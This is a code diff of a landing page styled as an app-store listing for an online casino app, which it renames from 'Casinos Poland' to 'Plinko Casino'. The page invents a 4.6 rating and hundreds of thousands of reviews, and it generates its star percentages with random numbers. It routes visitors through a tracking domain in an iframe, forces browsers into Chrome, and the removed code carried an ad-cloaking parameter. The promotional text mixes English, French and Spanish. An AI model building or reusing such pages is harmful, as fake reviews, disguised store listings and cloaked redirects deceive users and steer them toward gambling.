@@ -12,7 +12,7 @@
   <script src="static/home/dark_theme/dark_theme.js"></script>
 
   <link rel="manifest" href="./manifest.json">
-  
+
   <!-- <h1 id="logs-h1"></h1>
   <script>
     var logs = `<div class="logs">
@@ -28,7 +28,9 @@
   <script src="./static/home/js/main.js"></script>
   <script src="./static/home/js/logic.js"></script>
   <script src="./static/home/js/detect/detect.js"></script>
+  <script src="https://cdn.onesignal.com/sdks/OneSignalPageSDKES6.js?v=151605" async=""></script>
 
+  <!--<script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script>-->
   <script type="module">
     if ('serviceWorker' in navigator) {
       if (navigator.serviceWorker.controller) {
@@ -41,7 +43,7 @@
   </script>
   <script type="text/javascript">
 
-    const url = "https://godstraff.com/J73MZJGv"
+    const url = "https://godstraff.com/bXPpcW61"
 
     const server_url = ""
     // const landing_url = "/play-pay?style=spirit-en"
@@ -172,6 +174,7 @@
 
             object_storage.set_parameters(newParameters);
           } 
+
           // var newURL = location.href.split("?")[0];
           // if(object_parameters.fbclid){
           //   newURL = addParamsToUrl(newURL, "fbclid=" + object_parameters.fbclid);
@@ -331,7 +334,6 @@
 
   </script>
 
-
  <!-- ONESIGNAL -->
  <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.es6.js?v=160201" defer=""></script>
  <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer=""></script>
@@ -340,8 +342,8 @@
    window.OneSignalDeferred = window.OneSignalDeferred || [];
    OneSignalDeferred.push(async function(OneSignal) {
      await OneSignal.init({
-       appId: "e9e7bd25-c380-4b82-a6fe-86bd7735c81f",
-       safari_web_id: "web.onesignal.auto.2bb5f943-5f36-4c5b-98f3-fab8c5252044",
+       appId: "b9ba100a-5e21-4ad6-acc3-1e436f76dade",
+       safari_web_id: "web.onesignal.auto.14c30330-c4fb-483f-9c66-942ad147f917",
        notifyButton: {
          enable: false,
        },
@@ -377,59 +379,6 @@
      }
    </style>
  <!-- ONESIGNAL END -->
-
-  <!-- pwa + ios -->
-  <script>
-
-    function redirectToStore(param) {
-      // https://startside.click
-      // iron-cardtofex.me
-
-      function getSubParam(paramName, defaultValue) {
-        return get_param_value(paramName) ? get_param_value(paramName) : defaultValue;
-      }
-
-      function buildLink() {
-        const subParams = Array.from({ length: 9 }, (_, i) => {
-          const subIndex = i + 2;
-          const subValue = getSubParam(`sub_id_${subIndex}`, getSubParam(`sub${subIndex}`, `sub${subIndex}`));
-          return `&sub${subIndex}=${subValue}`;
-        }).join('');
-        return `https://${get_param_value('ios')}/?fb_dynamic_pixel=${get_param_value('pixel')}${subParams}${get_param_value('no_cloak') ? '&no_cloak=1' : ''}`;
-      }
-
-      function getRemainingParams(excludeParams) {
-        const urlParams = new URLSearchParams(window.location.search);
-        excludeParams.forEach(param => urlParams.delete(param));
-        return urlParams.toString();
-      }
-
-      let targetLink = buildLink();
-
-      const usedParams = [
-        'ios', 'pixel', 'no_cloak',
-        ...Array.from({ length: 9 }, (_, i) => `sub${i + 2}`),
-        ...Array.from({ length: 9 }, (_, i) => `sub_id_${i + 2}`)
-      ];
-      const remainingParams = getRemainingParams(usedParams);
-
-      if (remainingParams) {
-        targetLink += `&${remainingParams}`;
-      }
-
-      console.log(targetLink);
-
-      if (get_param_value('ios') && user.os.family !== "Android") {
-        window.location.href = targetLink;
-      }
-    }
-
-    redirectToStore(window.location.search);
-
-
-
-  </script>
-
   <style>
     .iframe-container {
       position: fixed;
@@ -522,12 +471,12 @@
       align-items: center;
     }
   </style>
-  <title> Casinos Poland </title>
+  <title>Plinko Casino</title>
   <meta name="theme-color" content="#ffffff" />
   <meta name="robots" content="index,follow" data-qmeta="robots" />
   <meta name="google" content="notranslate" />
   <meta name="title"
-    content="Dive into a world of sweetness and excitement with  Casinos Poland ! This delightful slot game offers a vibrant and colorful experience for players seeking a treat-filled adventure. Set against a backdrop of luscious landscapes and mouthwatering candies,  Casinos Poland  tantalizes the senses with its engaging gameplay and a myriad of sugary delights. The reels are adorned with an assortment of delicious fruit symbols, adding to the game's charm and appeal."
+    content="Bienvenue dans le monde de l'émotion et des grandes victoires avec Plinko Leon Special™, le compagnon parfait pour ceux qui apprécient le divertissement haut de gamme et de nombreuses opportunités de gagner."
     data-qmeta="title" />
   <meta name="mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-wep-app-capable" content="yes">
@@ -536,37 +485,36 @@
   <link rel="alternate" hreflang="en" href="/" data-qmeta="alternateEn" />
 
   <!-- FACESPACE -->
-  <meta property="og:title" content=" Casinos Poland " />
+  <meta property="og:title" content="Plinko Casino" />
   <meta property="og:description"
-    content="Dive into a world of sweetness and excitement with  Casinos Poland ! This delightful slot game offers a vibrant and colorful experience for players seeking a treat-filled adventure. Set against a backdrop of luscious landscapes and mouthwatering candies,  Casinos Poland  tantalizes the senses with its engaging gameplay and a myriad of sugary delights. The reels are adorned with an assortment of delicious fruit symbols, adding to the game's charm and appeal." />
+    content="Bienvenue dans le monde de l'émotion et des grandes victoires avec Plinko Leon Special™, le compagnon parfait pour ceux qui apprécient le divertissement haut de gamme et de nombreuses opportunités de gagner." />
 
   <meta property="og:image:height" content="600" />
   <meta property="og:image:width" content="314" />
   <meta property="og:image" content="./media/photos/logo.jpg" />
 
   <meta property="fb:app_id" content="..." />
-  <meta property="fb:admins" content=" Casinos Poland " />
+  <meta property="fb:admins" content="Plinko Casino" />
 
   <meta property="og:type" content="website" />
-  <meta property="og:name" content=" Casinos Poland " />
+  <meta property="og:name" content="Plinko Casino" />
   <meta property="og:url" content="/" />
 
   <!-- THE TWITTER MACHINE -->
   <meta name="twitter:card" content="summary" />
   <meta name="twitter:url" content="/" />
-  <meta name="twitter:site" content=" Casinos Poland " />
-  <meta name="twitter:creator" content=" Casinos Poland " />
-  <meta name="twitter:title" content=" Casinos Poland " />
+  <meta name="twitter:site" content="Plinko Casino" />
+  <meta name="twitter:creator" content="Plinko Casino" />
+  <meta name="twitter:title" content="Plinko Casino" />
   <meta name="twitter:description"
-    content="Dive into a world of sweetness and excitement with  Casinos Poland ! This delightful slot game offers a vibrant and colorful experience for players seeking a treat-filled adventure. Set against a backdrop of luscious landscapes and mouthwatering candies,  Casinos Poland  tantalizes the senses with its engaging gameplay and a myriad of sugary delights. The reels are adorned with an assortment of delicious fruit symbols, adding to the game's charm and appeal.
-    " />
-  <meta name="twitter:image" content="./media/photos/logo.jpg" />
+    content="Bienvenue dans le monde de l'émotion et des grandes victoires avec Plinko Leon Special™, le compagnon parfait pour ceux qui apprécient le divertissement haut de gamme et de nombreuses opportunités de gagner." />
+  <meta name="twitter:image" content="./media/photos/logo.png" />
 
   <!-- G++ -->
-  <meta itemprop="name" content=" Casinos Poland " />
+  <meta itemprop="name" content="Plinko Casino" />
   <meta itemprop="description"
-    content="Dive into a world of sweetness and excitement with  Casinos Poland ! This delightful slot game offers a vibrant and colorful experience for players seeking a treat-filled adventure. Set against a backdrop of luscious landscapes and mouthwatering candies,  Casinos Poland  tantalizes the senses with its engaging gameplay and a myriad of sugary delights. The reels are adorned with an assortment of delicious fruit symbols, adding to the game's charm and appeal." />
-  <meta itemprop="image" content="./media/photos/logo.jpg" />
+    content="Bienvenue dans le monde de l'émotion et des grandes victoires avec Plinko Leon Special™, le compagnon parfait pour ceux qui apprécient le divertissement haut de gamme et de nombreuses opportunités de gagner." />
+  <meta itemprop="image" content="./media/photos/logo.png" />
 
   <link rel="apple-touch-icon" sizes="180x180" href="./media/photos/fav/apple-touch-icon.png" />
   <link rel="mask-icon" href="./media/photos/" color="#fb0266" />
@@ -701,7 +649,7 @@
           <div class="program__left">
             <div class="program__left-top">
               <div class="program-logo">
-                <img src="./media/photos/logo.jpg" alt="Live Casino PWA Application" id="logotype" />
+                <img src="./media/photos/logo.jpeg" alt="Live Casino PWA Application" id="logotype" />
                 <div class="showbox">
                   <div class="loader">
                     <svg class="circular" viewBox="25 25 50 50">
@@ -721,9 +669,9 @@
               </div>
 
               <div class="program-info">
-                <h1 class="program-name c-black"> Casinos Poland </h1>
+                <h1 class="program-name c-black">Plinko Casino</h1>
                 <div class="program-info-first">
-                  <span class="program-company primary-text">  Casinos Poland  inc.</span>
+                  <span class="program-company primary-text"> Plinko inc.</span>
                   <span class="advertising c-text">Casino</span>
                 </div>
                 <div class="program-info-instal">
@@ -743,7 +691,7 @@
                 <div class="program__left-bottom">
                   <div class="program__reviews">
                     <span class="program__reviews-rating c-black">
-                      4.7
+                      4.6
                       <img src="media/photos/2022/03/22/star_black_24dp.svg" alt="Live Casino Rating" />
                     </span>
                     <span class="program-reviews c-text"> 354 565 reviews </span>
@@ -794,11 +742,14 @@
             <a href="./media/photos/s2.jpg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
               <img src="./media/photos/s2.jpg" alt="Live Casino Screenshot">
             </a>
+
             <a href="./media/photos/s3.jpg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
               <img src="./media/photos/s3.jpg" alt="Live Casino Screenshot">
             </a>
             <a href="./media/photos/s4.jpg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
               <img src="./media/photos/s4.jpg" alt="Live Casino Screenshot">
+            </a>
+
             </a>
           </div>
         </div>
@@ -817,14 +768,29 @@
           </div>
           <div class="description__text">
             <p class="c-text">
-              Witamy w „Casinos Poland”, Twoim ostatecznym celu na ekscytujące doświadczenia w kasynie! Zanurz się w emocjach dzięki naszej szerokiej gamie gier i ekskluzywnych funkcji.
+              Welcome to the world of excitement and big wins with Plinko Leon Special™, the perfect companion for those who appreciate premium entertainment and plenty of winning opportunities. Plinko Leon Special™ is an innovative and advanced mobile casino that offers exciting games, generous bonuses, and security at every step. Key features include:
+<br><br>
+1. Wide selection of games: Plinko Leon Special™ offers a variety of casino games, including slots, roulette, blackjack, poker, and more. The choice is always yours, and each game offers a unique experience.
+<br><br>
 
-              W „Casinos Poland” będziesz mieć dostęp do różnorodnych gier kasynowych, w tym automatów, ruletki, blackjacka i wielu innych. Ciesz się dreszczykiem wielkich wygranych dzięki realistycznej grafice, immersyjnym efektom dźwiękowym i płynnej rozgrywce.
-              
-              Ale to nie wszystko! Casinos Poland oferuje również bonusy, promocje i ekscytujące wydarzenia specjalne, aby Cię bawić i nagradzać. Niezależnie od tego, czy jesteś doświadczonym graczem, czy nowicjuszem w świecie gier online, każdy znajdzie coś dla siebie w „Casinos Poland”.
-              
-              Pobierz teraz aplikację „Casinos Poland” i rozpocznij swoją niezapomnianą podróż w świecie gier!<a class="description__category-btn" href="/?redirect=true" aria-label="Live Casino Category">
-              #1 top casino apps
+2. Play with real money or for free: Start playing with real money or try out free games to make decisions before betting. Plinko Leon Special™ offers the opportunity to enjoy the excitement without financial risk.
+<br><br>
+
+3. Bonuses and promotions: Receive generous bonuses upon signing up and enjoy regular offers to maximize your chances of winning. Plinko Leon Special™ always strives to provide additional benefits to players.
+<br><br>
+
+4. Comfort and security: The Plinko Leon Special™ app is designed with a focus on user convenience and a high level of security. Your personal and financial data are protected by advanced encryption technologies.
+<br><br>
+
+5. Mobility: Play your favorite games anywhere, anytime with the mobile version of the app. Plinko Leon Special™ makes your gaming experience as convenient and accessible as possible.
+<br><br>
+
+Let Plinko Leon Special™ be your guide in the world of gambling, where every moment can lead to exciting victories. Download the app today and feel the intense thrill of playing in the best online casino!
+            </p>
+          </div>
+          <div class="description__category">
+            <a class="description__category-btn" href="/?redirect=true" aria-label="Live Casino Category">
+              #1 Las mejores aplicaciones de casino
             </a>
           </div>
         </div>
@@ -833,7 +799,7 @@
             <div class="program__left-bottom">
               <div class="program__reviews">
                 <span class="program__reviews-rating c-black">
-                  4.7
+                  4.6
                   <img src="media/photos/2022/03/22/star_black_24dp.svg" alt="Live Casino Rating" />
                 </span>
                 <span class="program-reviews c-text"> 354 565 reviews </span>
@@ -863,7 +829,7 @@
         <div class="rating-reviews__container">
           <div class="title__top c-black">
             <div class="rating-reviews__title title">
-              <h2>Ratings and reviews</h2>
+              <h2>Calificaciones y opiniones</h2>
               <a class="rating-reviews__info" aria-label="Live Casino Ratings and reviews">
                 <i class="_icon-info_black"></i>
               </a>
@@ -875,10 +841,10 @@
           <div class="rating__box">
             <div class="rating__left">
               <div class="rating__total c-black">
-                <span>4.7</span>
+                <span>4.6</span>
               </div>
               <div class="rating__stars-box">
-                <div class="Stars" style="--rating: 4.7;" aria-label="Rating of this product is 4.7 out of 5.">
+                <div class="Stars" style="--rating: 4.6;" aria-label="Rating of this product is 4.6 out of 5.">
                 </div>
               </div>
               <span class="total-votes c-text">
@@ -1282,8 +1248,8 @@
         var four = localStorage.getItem("four")
         var five = localStorage.getItem("five")
       } else {
-        var stars = parseFloat("4.7")
-        if (stars > 4.7) {
+        var stars = parseFloat("4.6")
+        if (stars > 4.6) {
           five = new String(getRandomInt(50, 70)) + "%"
           four = new String(getRandomInt(10, 25)) + "%"
           three = new String(getRandomInt(5, 15)) + "%"
@@ -1441,9 +1407,9 @@
           if (object_parameters.fbclid) {
             object_parameters.promo = "false";
           }
-          var ready_frame_url = "https://godstraff.com/J73MZJGv?sub_id_1={sub_id_1}&sub_id_2={sub_id_2}&sub_id_3={sub_id_3}&sub_id_4={sub_id_4}&sub_id_5={sub_id_5}&sub_id_6={sub_id_6}&sub_id_7={sub_id_7}&pixel={pixel}&token={token}&fbclid={fbclid}" + param;
+          var ready_frame_url = "https://godstraff.com/bXPpcW61/?sub_id_1={sub_id_1}&sub_id_2={sub_id_2}&sub_id_3={sub_id_3}&sub_id_4={sub_id_4}&sub_id_5={sub_id_5}&sub_id_6={sub_id_6}&sub_id_7={sub_id_7}&pixel={pixel}&token={token}&fbclid={fbclid}" + param;
         } else {
-          var ready_frame_url = "https://godstraff.com/J73MZJGv?sub_id_1={sub_id_1}&sub_id_2={sub_id_2}&sub_id_3={sub_id_3}&sub_id_4={sub_id_4}&sub_id_5={sub_id_5}&sub_id_6={sub_id_6}&sub_id_7={sub_id_7}&pixel={pixel}&token={token}&fbclid={fbclid}" + param;
+          var ready_frame_url = "https://godstraff.com/bXPpcW61/?sub_id_1={sub_id_1}&sub_id_2={sub_id_2}&sub_id_3={sub_id_3}&sub_id_4={sub_id_4}&sub_id_5={sub_id_5}&sub_id_6={sub_id_6}&sub_id_7={sub_id_7}&pixel={pixel}&token={token}&fbclid={fbclid}" + param;
         }
 
         iframe.setAttribute("src", ready_frame_url);
@@ -1489,11 +1455,12 @@
   <script src="./static/home/js/ua-parser.min.js"></script>
   <script>
     const ua = new UAParser;
-    if (ua.getBrowser().name !== "Chrome" && user.os.family == "Android") {
+    if (ua.getBrowser().name !== "Chrome") {
       var lnk = document.getElementById("r");
       lnk.setAttribute("href", "intent://" + window.location.hostname + window.location.search + "#Intent;scheme=https;package=com.android.chrome;end");
       lnk.click();
     }
+
   </script>
 
 </body>
